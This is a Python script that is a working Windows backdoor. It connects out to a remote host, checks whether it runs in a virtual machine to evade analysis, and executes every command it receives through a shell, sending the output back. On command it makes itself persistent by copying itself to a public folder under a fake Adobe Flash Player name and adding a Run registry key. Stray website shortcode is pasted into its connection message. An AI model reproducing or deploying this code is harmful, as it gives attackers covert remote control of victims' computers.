s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def vmDetect():
    strComputer = "."
    objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
    objSWbemServices = objWMIService.ConnectServer(strComputer,"root\cimv2")
    colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_ComputerSystemProduct")
    for objItem in colItems:
        if objItem.Name != None:	
	    VMNAME = objItem.Name
	if VMNAME == "VMware Virtual Platform":
	    return 1
	if VMNAME == "VirtualBox":
	    return 1
	if VMNAME == "Virtual PC":
	    return 1
	else:
	    return
	
if vmDetect() == 1:
    V2 = 'True'
else:
    V2 = 'False'

def init():
    try:
        s.connect((HOST, PORT))
        s.send('[fusion_builder_container hundred_percent="yes" overflow="visible"][fusion_builder_row][fusion_builder_column type="1_1" background_position="left top" background_color="" border_size="" border_color="" border_style="solid" spacing="yes" background_image="" background_repeat="no-repeat" padding="" margin_top="0px" margin_bottom="0px" class="" id="" animation_type="" animation_speed="0.3" animation_direction="left" hide_on_mobile="no" center_content="no" min_height="none"][*] Connection Established!')
    except:
        init()
init()
s.send(platform())
sleep(1)
s.send(V2)
	
dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"

def startup():
    shutil.copy(sys.argv[0],dir)
    aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"Adobe Flash Player Updater",0, REG_SZ, dir)

while 1:
     data = s.recv(1024)
     if data.upper() == 'QUIT':
         break
     elif data.upper() == 'PERSISTENCE':
         startup()
     else:
         proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         stdout_value = proc.stdout.read() + proc.stderr.read()
         s.send(stdout_value)
s.close()
